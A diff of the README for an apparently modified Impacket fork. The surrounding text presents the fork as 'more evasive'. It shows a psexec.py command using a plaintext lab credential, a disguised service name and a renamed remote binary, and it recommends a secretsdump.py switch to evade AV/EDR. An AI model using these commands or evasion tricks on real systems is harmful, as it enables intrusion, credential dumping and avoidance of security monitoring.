@@ -8,6 +8,8 @@ Copyright Fortra, LLC and its affiliated companies. All rights reserved.
 
 Impacket was originally created by [SecureAuth](https://www.secureauth.com/labs/open-source-tools/impacket), and now maintained by Fortra's Core Security.
 
+***
+
 *This version was modified by me to make it more evasive*
 
 To install the modified version:
@@ -23,6 +25,8 @@ psexec.py can be used like this to make it more evasive
 python3 psexec.py north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 -file ../psexec-mod/NjWQJYhRSvc.exe -service-name "PrintWorkflow_7c3bc" -remote-binary-name "WMSysPr9.exe" -debug
 ```
 For secretsdump.py use the `-use-remoteSSMethod` switch to evade some AV/EDR's
+
+***
 
 Impacket is a collection of Python classes for working with network
 protocols. Impacket is focused on providing low-level
